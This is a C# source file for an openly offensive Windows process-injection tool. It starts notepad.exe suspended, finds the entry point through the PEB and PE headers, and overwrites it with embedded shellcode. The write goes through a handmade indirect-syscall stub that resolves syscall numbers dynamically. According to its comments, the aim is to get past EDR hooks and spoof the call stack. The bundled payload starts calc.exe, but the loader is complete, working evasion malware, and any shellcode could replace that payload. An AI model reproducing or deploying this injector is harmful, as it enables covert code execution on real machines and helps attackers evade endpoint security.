/*

 * Target Environment: C# 5.0 (.NET Framework 4.8) / 64-bit Windows
 * 
 * * DESCRIPTION:
 * This tool performs a highly evasive, surgical process injection into a suspended 
 * legitimate binary (e.g., notepad.exe). Instead of traditional process hollowing 
 * (which causes instability and crashes on modern Windows), it parses the remote 
 * Process Environment Block (PEB) and PE headers to locate the AddressOfEntryPoint. 
 * It then overwrites only the entry point with the payload and lets the native 
 * Windows OS Loader execute it organically, avoiding noisy Thread Hijacking APIs.

**Indirect Syscalls (1 Total):**
- `NtWriteVirtualMemory`: This is the only function utilizing the Halo's Gate assembly stub. We did this because injecting code across process boundaries is the single most heavily monitored action by EDRs.
    
**Standard NTAPI Calls (3 Total):**
- `NtQueryInformationProcess`: Used to find the PEB base address.
- `NtReadVirtualMemory`: Used to read the PEB and the PE headers.
- `NtResumeThread`: Used to wake up the suspended Notepad process. _(Note: We eliminated `NtGetContextThread` and `NtSetContextThread` in the final version to improve stability and stealth)._
    
**Standard Win32 API Calls (5 Total):**
- `CreateProcess`: To spawn the suspended `notepad.exe` container.
- `VirtualProtectEx`: Used twice (to make the Entry Point writable, and then to restore its original protections).
- `VirtualAlloc`: Used locally to allocate executable memory for our C# assembly stub.
- `GetModuleHandle` & `GetProcAddress`: Used to manually resolve the addresses of the NT functions inside `ntdll.dll`.
 
 * * ADVANCED EVASION TECHNIQUES USED:
 * * 1. Halo's Gate (Dynamic SSN Resolution):
 * Actively defeats EDR inline user-mode hooks (JMP patches) on NTAPI functions.
 * It scans memory upwards and downwards (in 32-byte increments) from the hooked 
 * NtWriteVirtualMemory stub to find a clean neighbor syscall, reads its SSN, 
 * and dynamically calculates the true, unhooked System Service Number.
 
 * * 2. Indirect Syscalls:
 * Bypasses user-mode API monitoring by executing a raw system call. It utilizes 
 * a custom assembly stub that preserves the Windows x64 ABI (moving RCX to R10), 
 * loads the clean SSN, and executes a naked `JMP` to a legitimate `syscall; ret` 
 * gadget found inside ntdll.dll. This spoofs the call stack, making the execution 
 * appear to originate from a legitimate Windows module.
 
 * * 3. C# / Native x64 ABI Alignment:
 * Prevents STATUS_INVALID_SYSTEM_SERVICE (0xC000001C) and STATUS_ACCESS_VIOLATION 
 * (0xC0000005) crashes by pinning managed shellcode in memory (GCHandle) to stop 
 * Garbage Collector interference, using strictly aligned UnmanagedFunctionPointers, 
 * and ensuring the assembly stub does not desynchronize the 5-parameter stack space 
 * created by the .NET Marshaller.
 
 * * 4. Context-Free Execution:
 * Completely avoids NtGetContextThread and NtSetContextThread. By resuming the 
 * suspended thread naturally, the OS loader builds the environment, loads kernel32, 
 * and natively trips over the stomped entry point, maximizing stability.
 * =========================================================================================
 */

using System;
using System.Runtime.InteropServices;

namespace IndirectHollowing
{
    class Program
    {
        // Standard x64 Calculator Shellcode
        private static byte[] payload64 = new byte[] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,
            0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,
            0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
            0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
            0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,
            0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
            0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO { public int cb; public IntPtr res1, res2, res3; public int x, y, xs, ys, xc, yc, fill, flags; public short show, res4; public IntPtr res5, hIn, hOut, hErr; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint pid, tid; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PBI { public IntPtr Exit, Peb, Affinity, Priority, UniqueId, ParentId; }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtWriteVirtualMemory(IntPtr hProc, IntPtr baseAddr, IntPtr buffer, IntPtr size, IntPtr written);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtQueryInformationProcess(IntPtr h, int p, ref PBI pbi, uint l, out uint r);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtReadVirtualMemory(IntPtr h, IntPtr b, IntPtr buf, uint s, out IntPtr w);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint NtResumeThread(IntPtr h, out uint c);

        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr b, uint s, uint nP, out uint oP);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string n);

        static uint GetSSN(IntPtr funcAddr)
        {
            for (int i = 0; i < 32; i++)
            {
                if (Marshal.ReadByte(funcAddr, i) == 0x4C &&
                    Marshal.ReadByte(funcAddr, i + 1) == 0x8B &&
                    Marshal.ReadByte(funcAddr, i + 2) == 0xD1 &&
                    Marshal.ReadByte(funcAddr, i + 3) == 0xB8)
                {
                    return (uint)Marshal.ReadInt32(funcAddr, i + 4);
                }
            }
            throw new Exception("SSN not found");
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Starting Flawless Indirect Syscall Stomper...");
            IntPtr ntdll = GetModuleHandle("ntdll.dll");

            IntPtr ntWriteAddr = GetProcAddress(ntdll, "NtWriteVirtualMemory");
            uint ssn = GetSSN(ntWriteAddr);

            IntPtr gadget = IntPtr.Zero;
            for (int i = 0; i < 256; i++)
            {
                if (Marshal.ReadByte((IntPtr)(ntWriteAddr.ToInt64() + i)) == 0x0F && Marshal.ReadByte((IntPtr)(ntWriteAddr.ToInt64() + i + 1)) == 0x05)
                {
                    gadget = (IntPtr)(ntWriteAddr.ToInt64() + i); break;
                }
            }
            Console.WriteLine("[+] Resolved SSN: 0x{0:X} | Gadget: 0x{1:X}", ssn, gadget.ToInt64());

            // --- 🟢 THE FIX: Pristine Naked JMP using R11 🟢 ---
            byte[] stub = {
                0x4C, 0x8B, 0xD1,                                           // 0-2: mov r10, rcx
                0xB8, 0x00, 0x00, 0x00, 0x00,                               // 3-7: mov eax, <SSN>
                0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 8-17: mov r11, <Gadget>
                0x41, 0xFF, 0xE3                                            // 18-20: jmp r11
            };

            Array.Copy(BitConverter.GetBytes(ssn), 0, stub, 4, 4);
            Array.Copy(BitConverter.GetBytes(gadget.ToInt64()), 0, stub, 10, 8); // Offset is now 10

            IntPtr pStub = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, 0x3000, 0x40);
            Marshal.Copy(stub, 0, pStub, stub.Length);
            var indirectWrite = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(pStub, typeof(NtWriteVirtualMemory));

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            if (!CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) return;
            Console.WriteLine("[+] Notepad spawned (PID: {0})", pi.pid);

            var qInfo = (NtQueryInformationProcess)GetD(ntdll, "NtQueryInformationProcess", typeof(NtQueryInformationProcess));
            var rMem = (NtReadVirtualMemory)GetD(ntdll, "NtReadVirtualMemory", typeof(NtReadVirtualMemory));

            PBI pbi = new PBI(); uint rL;
            qInfo(pi.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rL);

            IntPtr pBuf = Marshal.AllocHGlobal(8); IntPtr bytesRead;
            rMem(pi.hProcess, (IntPtr)(pbi.Peb.ToInt64() + 16), pBuf, 8, out bytesRead);
            IntPtr tBase = Marshal.ReadIntPtr(pBuf);
            Marshal.FreeHGlobal(pBuf);

            IntPtr hBuf = Marshal.AllocHGlobal(512);
            rMem(pi.hProcess, tBase, hBuf, 512, out bytesRead);
            int e_lfanew = Marshal.ReadInt32((IntPtr)(hBuf.ToInt64() + 0x3C));
            int entryRVA = Marshal.ReadInt32((IntPtr)(hBuf.ToInt64() + e_lfanew + 0x28));
            IntPtr remoteEntry = (IntPtr)(tBase.ToInt64() + entryRVA);
            Marshal.FreeHGlobal(hBuf);

            uint oldP;
            VirtualProtectEx(pi.hProcess, remoteEntry, (uint)payload64.Length, 0x40, out oldP);

            GCHandle pinned = GCHandle.Alloc(payload64, GCHandleType.Pinned);
            uint status = indirectWrite(pi.hProcess, remoteEntry, pinned.AddrOfPinnedObject(), (IntPtr)payload64.Length, IntPtr.Zero);
            pinned.Free();
            Console.WriteLine("[+] Indirect Write Status: 0x{0:X}", status);

            uint dummy;
            VirtualProtectEx(pi.hProcess, remoteEntry, (uint)payload64.Length, oldP, out dummy);

            if (status == 0)
            {
                var resume = (NtResumeThread)GetD(ntdll, "NtResumeThread", typeof(NtResumeThread));
                uint count;
                resume(pi.hThread, out count);
                Console.WriteLine("[+] SUCCESS: Thread Resumed. Calculator outbound.");
            }

            Console.ReadLine();
        }

        static Delegate GetD(IntPtr m, string n, Type t) { return Marshal.GetDelegateForFunctionPointer(GetProcAddress(m, n), t); }
    }
}
